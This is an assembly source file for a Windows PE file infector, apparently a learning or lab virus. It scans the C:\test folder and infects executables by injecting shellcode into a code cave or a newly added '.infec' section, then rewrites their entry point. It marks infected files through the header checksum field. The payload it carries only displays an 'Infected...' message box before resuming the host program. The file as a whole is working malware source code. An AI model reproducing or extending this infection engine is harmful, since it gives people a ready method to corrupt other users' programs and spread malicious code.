BITS 32
EXTERN  _CreateFileA@28, _GetFileSize@8, _CreateFileMappingA@24
EXTERN  _MapViewOfFile@20, _GetProcAddress@8, _LoadLibraryA@4
EXTERN  _HeapAlloc@12, _HeapFree@12, _GetProcessHeap@0
EXTERN  _MessageBoxA@16, _CloseHandle@4, _ExitProcess@4, _printf, _memcpy, _lstrcmpiA@8
EXTERN _FindFirstFileA@8, _FindNextFileA@8, _FindClose@4, _GetLastError@0, _GetModuleFileNameA@12, _UnmapViewOfFile@4, _CreateMutexA@12, _PathFindExtensionA@4

%define GENERIC_READ     0x80000000
%define GENERIC_WRITE    0x40000000
%define OPEN_EXISTING    3
%define FILE_SHARE_READ 0x00000001
%define FILE_SHARE_WRITE 0x00000002
%define FILE_ATTRIBUTE_NORMAL 0x80
%define FILE_ATTRIBUTE_DIRECTORY 0x00000010
%define FILE_ATTRIBUTE_SYSTEM 0x00000004
%define FILE_MAP_ALL_ACCESS   0xF001F
%define PAGE_READWRITE  0x04
%define MEM_COMMIT      0x1000
%define MEM_RESERVE     0x2000
%define HEAP_ZERO_MEMORY 0x00000008
%define INVALID_HANDLE_VALUE -1
%define ERROR_NO_MORE_FILES 18
%define IMAGE_SCN_MEM_WRITE 0x80000000
%define IMAGE_SCN_MEM_READ 0x40000000
%define IMAGE_SCN_MEM_EXECUTE 0x20000000
%define SHELLCODE_MARK  0xAAAAAAAA
%define MZ_SIGNATURE 0x5A4D
%define PE_SIGNATURE 0x00004550
%define NT32 0x010B
%define ERROR_ALREADY_EXISTS 183
%define SEC_IMAGE 0x1000000


SECTION .data
search_path   db "C:\test\*", 0
path          db "C:\test\\", 0
mutex_name db "MyUniqueMutex", 0
msg_exists db "[!] Another instance is already running.", 0Ah, 0
msg_open_err  db "[-] Cannot open file: %s!", 0Ah, 0
msg_create_map db "[-] Cannot create file mapping: %s!", 0Ah, 0
msg_skip db "[!] Skipping %s: already infected", 0Ah, 0
msg_unmap      db "[-] Cannot map file: %s!", 0Ah, 0
msg_alloc_err db "[-] Cannot alloc heap!", 0Ah, 0
msg_find_err  db "[-] Cannot find file", 0Ah, 0
sys_msg       db "[-] Infection failed: File %s is a sys file", 0Ah, 0
not_pe_msg    db "[-] Infection failed: File %s not a PE file", 0Ah, 0
pe_msg        db "[-] Infection failed: File %s is not a PE32 file", 0Ah, 0
no_more_files db "[-] No more files", 0Ah, 0
msg_done      db "[+] Infection file %s complete", 0Ah, 0
msg_shellcode db "[-] Shellcode not found", 0Ah, 0
msg_code_cave db "[-] Code cave not found in file: %s!", 0Ah, 0
format db "Pointer to raw data: 0x%X", 0Ah, 0
format1 db "Name: %s", 0
image_size db "Size of image: 0x%X", 0Ah, 0
nums db "Num of sections: 0x%X", 0Ah, 0
rva db "RVA: 0x%X", 0Ah, 0
raw_data db "Raw Data: 0x%X", 0Ah, 0
size_raw_data db "Size raw Data: 0x%X", 0Ah, 0
characteristic db "Characteristic: 0x%X", 0Ah, 0
v_size db "Virtual Size: 0x%X", 0Ah, 0
new_entry db "Entry point: 0x%X", 0Ah, 0



SECTION .bss
hFile     resd 1
hFind     resd 1
hMap      resd 1
hMutex    resd 1
hHeap     resd 1
hUser32   resd 1
new_rva   resd 1
old_raw   resd 1
old_pointer_raw resd 1
sizeofimage resd 1
find_data resd 1
edit_path resb 260
self_path resb 260
lpMessageBox resd 1
lpFile    resd 1
lpShellcode resd 1
filesize  resd 1
dwCount resd 1
dwPosition resd 1
optional_size resd 1
section_num resd 1
new_section_num resd 1
last_section resd 1
dwShellcodeSize resd 1
oep       resd 1
msgboxptr resd 1
cave_off  resd 1

SECTION .text
GLOBAL _main
_main:
get_modulefilename:
    push 260
    push self_path
    push 0
    call _GetModuleFileNameA@12

; HANDLE CreateMutexA(LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR)
    push mutex_name         ; lpName
    push 0                  ; bInitialOwner = FALSE
    push 0                  ; lpMutexAttributes = NULL
    call _CreateMutexA@12
    mov [hMutex], eax

    ; check if mutex already exists
    call _GetLastError@0
    cmp eax, ERROR_ALREADY_EXISTS
    jne find_first_file

    ; nếu mutex đã tồn tại
    push msg_exists
    call _printf
    add esp, 4
    push 0
    call _ExitProcess@4

find_first_file:
    push find_data
    push search_path
    call _FindFirstFileA@8
    mov [hFind], eax
    cmp eax, INVALID_HANDLE_VALUE
    je find_error
    

find_next_file:
    mov eax, [find_data+0x0]
    and eax, FILE_ATTRIBUTE_DIRECTORY
    cmp eax, 0
    jne continue_loop
    jmp analyze_path
analyze_path:
    lea esi, [path]
    lea edi, [edit_path]
copy_path:
    lodsb
    stosb
    test al, al
    jnz copy_path
    dec edi
    mov al, '\'
    stosb
    lea esi, [find_data + 0x2c]
copy_filename:
    lodsb
    stosb
    test al, al
    jnz copy_filename
skip:
    push edit_path
    push self_path
    call _lstrcmpiA@8
    cmp eax, 0
    je continue_loop      ; nếu edit_path == self_path thì bỏ qua chính mình



open_file:
    ; Open file
    push 0
    push FILE_ATTRIBUTE_NORMAL
    push OPEN_EXISTING
    push 0
    push FILE_SHARE_READ | FILE_SHARE_WRITE
    push GENERIC_READ | GENERIC_WRITE
    push edit_path
    call _CreateFileA@28
    mov [hFile], eax
    cmp eax, INVALID_HANDLE_VALUE
    je fail_open
    

get_filesize:
    push 0
    push eax
    call _GetFileSize@8
    mov [filesize], eax
create_filemapping:
    ; CreateFileMapping
    push 0
    push dword [filesize]
    push 0
    push PAGE_READWRITE
    push 0
    push dword [hFile]
    call _CreateFileMappingA@24
    mov [hMap], eax
    cmp eax, 0
    je fail_create_map
    
map_viewoffile:
    ; MapViewOfFile
    push dword [filesize]
    push 0
    push 0
    push FILE_MAP_ALL_ACCESS
    push dword [hMap]
    call _MapViewOfFile@20
    mov [lpFile], eax
    cmp eax, 0
    je fail_mapviewoffile
    

check:
    mov ebx, [lpFile]
    cmp word [ebx], MZ_SIGNATURE
    je check1
    jmp not_pe_file
check1:
    mov ecx, [ebx + 0x3C]
    add ecx, ebx
    mov esi, ecx
    cmp dword [ecx], PE_SIGNATURE
    je check_pe32
    jmp not_pe_file
check_pe32:
    mov ecx, [ebx+0x3C]
    add ecx, ebx
    add ecx, 4
    add ecx, 20
    cmp word [ecx], NT32
    je check_sys
    jmp not_pe32
check_sys:
    mov ecx, [ebx + 0x3C]
    add ecx, ebx
    add ecx, 4
    add ecx, 20
    add ecx, 68
    cmp word [ecx], 1
    je sys_file
    jmp infected_file
infected_file:
    mov esi, [lpFile]
    add esi, [esi + 0x3C]
    add esi, 4
    add esi, 20
    add esi, 0x58
    cmp dword [esi], 0
    je preprocess
    jmp infected_msg
preprocess:
    ; Get OEP (AddressOfEntryPoint + ImageBase)
    mov esi, [lpFile]
    add esi, [esi + 0x3C]        ; e_lfanew
    mov ebx, esi
    mov eax, [ebx + 0x28]        ; AddressOfEntryPoint
    mov ecx, [ebx + 0x34]        ; ImageBase
    mov [oep], eax

    

    add ebx, 4
    add ebx, 2
    movzx ecx, word [ebx]
    mov [section_num], ecx      ; Num of section
    mov [new_section_num], ecx

    mov ebx, esi
    add ebx, 4
    add ebx, 16
    movzx ecx, word [ebx]
    mov [optional_size], ecx

    mov ebx, esi
    add ebx, 4
    add ebx, 20
    add ebx, dword [optional_size]
    movzx ecx, word [section_num]
    sub ecx, 1
    imul ecx, 40
    add ebx, ecx
    mov eax, [ebx+0x10]
    mov [old_raw], eax
    mov eax, [ebx+0x14]
    mov [old_pointer_raw], eax

    mov esi, [lpFile]
    mov ecx, [ebx + 0x14]    ; PointerToRawData of last section
    xor edx, edx                      ; dwCount = 0
    mov eax, shellcode_end - shellcode  ; shellcode size
    mov [dwShellcodeSize], eax

.find_cave:
    cmp ecx, [filesize]
    jae new_section                ; if dwPosition >= dwFileSize, fail

    cmp byte [esi + ecx], 0x00      ; *(lpFile + dwPosition)
    jne .reset_count

    inc edx                      ; dwCount++
    cmp edx, eax
    je .found_cave
    inc ecx                      ; dwPosition++
    jmp .find_cave

.reset_count:
    xor edx, edx                 ; dwCount = 0
    inc ecx                      ; dwPosition++
    jmp .find_cave

.found_cave:
    sub ecx, eax                 ; dwPosition -= shellcodeSize
    mov [dwPosition], ecx        ; save result
    jmp heap_alloc               ; next step in your logic

new_section:

    mov eax, [ebx+0xc]
    mov [new_rva], eax
    mov edx, 4095
    mov eax, [ebx+0x8]
    add eax, edx
    not edx
    and eax, edx
    add eax, [new_rva]
    mov [new_rva], eax      ; rva cua section moi
    add ebx, 40
    mov [ebx+0xc], eax

    mov esi, [lpFile]
    add esi, [esi + 0x3C]
    mov eax, [new_rva]
    add eax, [dwShellcodeSize]
    not edx
    add eax, edx
    not edx
    and eax, edx
    mov [sizeofimage], eax  ; size of image cap nhat
    mov [esi+24+0x38], eax

    mov eax, esi
    add eax, 4
    add eax, 2
    movzx ecx, word [eax]
    add ecx, 1      ; them 1 section
    mov [new_section_num], ecx
    mov [esi+4+2], ecx

    mov dword [ebx], ".inf" ; name
    mov dword [ebx+4], "ec"

    mov eax, [dwShellcodeSize]
    mov [ebx+8], eax         ;Virtualsize

    mov edx, 511
    add eax, edx
    not edx
    and eax, edx
    mov [ebx+0x10], eax      ;SizeofRawData

    mov eax, [old_pointer_raw]
    mov ecx, [old_raw]
    add eax, ecx
    mov [ebx+0x14], eax      ;PointertoRawData

    mov eax, 0x42000040
    or eax, IMAGE_SCN_MEM_WRITE
    or eax, IMAGE_SCN_MEM_READ
    or eax, IMAGE_SCN_MEM_EXECUTE   ;Characteristic
    mov [ebx+0x24], eax
heap_alloc:
    call _GetProcessHeap@0
    mov [hHeap], eax
    cmp eax, 0
    je fail_alloc
    push dword [dwShellcodeSize]
    push HEAP_ZERO_MEMORY
    push dword [hHeap]
    call _HeapAlloc@12
    cmp eax, 0
    je fail_alloc
    mov [lpShellcode], eax
    push dword [dwShellcodeSize]
    push shellcode
    push dword [lpShellcode]
    call _memcpy

get_library:
    push user32_str
    call _LoadLibraryA@4
    mov [hUser32], eax
    push msgbox_str
    push dword [hUser32]
    call _GetProcAddress@8
    mov [lpMessageBox], eax

    xor ecx, ecx
    mov esi, [lpShellcode]
    mov eax, [lpMessageBox]

find_inject1:
    cmp ecx, [dwShellcodeSize]
    jae not_found_shellcode
    cmp dword [esi+ecx], SHELLCODE_MARK
    je inject_1
    inc ecx
    jmp find_inject1
inject_1:
    mov [esi+ecx], eax
    jmp pre_step
pre_step:
    xor ecx, ecx
    mov esi, [lpShellcode]
    jmp find_inject2

find_inject2:
    cmp ecx, [dwShellcodeSize]
    jae not_found_shellcode
    cmp dword [esi+ecx], SHELLCODE_MARK
    je inject_2
    inc ecx
    jmp find_inject2
inject_2:
    ; tính OEP_RVA thay vì VA
    mov edx, [lpFile]
    add edx, [edx + 0x3C]     ; edx = nt_headers
    mov edx, [edx + 0x28]     ; AddressOfEntryPoint (RVA)
    mov [esi+ecx], edx        ; ghi vào shellcode
    jmp copy_position

copy_position:
    mov eax, [section_num]
    cmp eax, [new_section_num]
    je copy_position_codecave
    mov esi, [lpFile]
    mov eax, [ebx+0x14]
    add eax, esi             ; eax = lpFile + PointertoRawData
    push dword [dwShellcodeSize]
    push dword [lpShellcode]
    push eax                 ; lpFile + PointertoRawData
    call _memcpy

copy_position_codecave:
    mov esi, [lpFile]
    mov eax, [dwPosition]
    add eax, esi
    push dword [dwShellcodeSize]
    push dword [lpShellcode]
    push eax
    call _memcpy
heap_free:
    call _GetProcessHeap@0
    mov [hHeap], eax
    push dword [lpShellcode]
    push 0
    push dword [hHeap]
    call _HeapFree@12

    mov ecx, [section_num]
    cmp ecx, [new_section_num]
    je permission
    jmp patch_entrypoint

patch_entrypoint:
    mov esi, [lpFile]
    add esi, [esi + 0x3C]        ; e_lfanew
    mov ecx, esi
    mov eax, [ebx+0x14]
    add eax, [ebx+0xc]           ; VirtualAddress
    sub eax, [ebx+0x14]          ; PointerToRawData
    mov [ecx+0x28], eax          ;AddressOfEntryPoint
    jmp done

permission:
    mov eax, [ebx+0x8]
    add eax, [dwShellcodeSize]
    mov [ebx+0x8], eax
    mov eax, [ebx+0x24]
    or eax, IMAGE_SCN_MEM_WRITE
    or eax, IMAGE_SCN_MEM_READ
    or eax, IMAGE_SCN_MEM_EXECUTE
    mov [ebx+0x24], eax

patch_entrypoint_codecave:
    mov esi, [lpFile]
    add esi, [esi + 0x3C]        ; e_lfanew
    mov ecx, esi
    mov eax, [dwPosition]
    add eax, [ebx+0xc]           ; VirtualAddress
    sub eax, [ebx+0x14]          ; PointerToRawData
    mov [ecx+0x28], eax          ;AddressOfEntryPoint
    
done:

    mov esi, [lpFile]
    add esi, [esi + 0x3C]
    add esi, 4
    add esi, 20
    add esi, 0x58
    mov eax, [oep]
    mov dword [esi], eax

    push dword [lpFile]
    call _UnmapViewOfFile@4
    push dword [hMap]
    call _CloseHandle@4
    push dword [hFile]
    call _CloseHandle@4

    push edit_path
    push msg_done
    call _printf
    add esp, 8
    jmp continue_loop

fail_open:
    push edit_path
    push msg_open_err
    call _printf
    add esp, 8
    jmp continue_loop
fail_create_map:
    push edit_path
    push msg_create_map
    call _printf
    add esp, 8
    jmp continue_loop
fail_mapviewoffile:
    push edit_path
    push msg_unmap
    call _printf
    add esp, 8
    push dword [lpFile]
    call _UnmapViewOfFile@4
    jmp continue_loop
sys_file:
    push edit_path
    push sys_msg
    call _printf
    add esp, 8
    jmp continue_loop
not_pe_file:
    push edit_path
    push not_pe_msg
    call _printf
    add esp, 8
    jmp continue_loop
not_pe32:
    push edit_path
    push pe_msg
    call _printf
    add esp, 8
    jmp continue_loop
infected_msg:
    push edit_path
    push msg_skip
    call _printf
    add esp, 8
    jmp continue_loop
fail_alloc:
    push msg_alloc_err
    call _printf
    add esp, 4
    jmp continue_loop
not_found:
    push edit_path
    push msg_code_cave
    call _printf
    add esp, 8
    jmp continue_loop
not_found_shellcode:
    push msg_shellcode
    call _printf
    add esp, 4
    jmp continue_loop

continue_loop:
    lea eax, [find_data]
    push eax
    push dword [hFind]
    call _FindNextFileA@8
    cmp eax, 0
    jne find_next_file
    jmp find_error
find_error:
    call _GetLastError@0
    cmp eax, ERROR_NO_MORE_FILES
    je find_close
    push msg_find_err
    call _printf
    add esp, 4

find_close:
    push no_more_files
    call _printf
    add esp, 4
    push dword [hFind]
    call _FindClose@4    

exit:
    push 0
    call _ExitProcess@4




; ------------------------------
SECTION .data
user32_str db "user32.dll", 0
msgbox_str db "MessageBoxA", 0

shellcode:
    pushad
    call .get_eip
.get_eip:
    pop ebp
    sub ebp, .get_eip

    push 0
    lea eax, [ebp + caption]
    push eax
    lea eax, [ebp + text]
    push eax
    push 0
    mov eax, SHELLCODE_MARK
    call eax

    popad
    ; jump to OEP (rebased)
    mov eax, fs:[0x30]
    mov eax, [eax+0x8]          ; ImageBase
    add eax, SHELLCODE_MARK     ; <- placeholder = AddressOfEntryPoint (RVA)
    jmp eax

caption db 'Hello world', 0
text    db 'Infected...', 0
shellcode_end:
